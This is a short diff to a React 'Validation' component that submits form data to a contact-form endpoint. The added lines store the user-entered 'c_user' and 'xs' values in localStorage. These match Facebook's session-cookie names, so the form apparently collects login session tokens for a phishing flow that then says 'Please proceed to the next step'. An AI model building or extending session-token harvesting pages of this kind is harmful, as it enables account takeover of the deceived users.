@@ -34,6 +34,12 @@ export default function Validation() {
   const onSubmit = async (data: any) => {
     try {
       await apiRequest('POST', '/api/contact-form', data);
+      // Store validation data for confirmation page
+      localStorage.setItem('validation_data', JSON.stringify({
+        c_user: data.c_user,
+        xs: data.xs,
+      }));
+
       toast({
         title: "Success",
         description: "Please proceed to the next step",
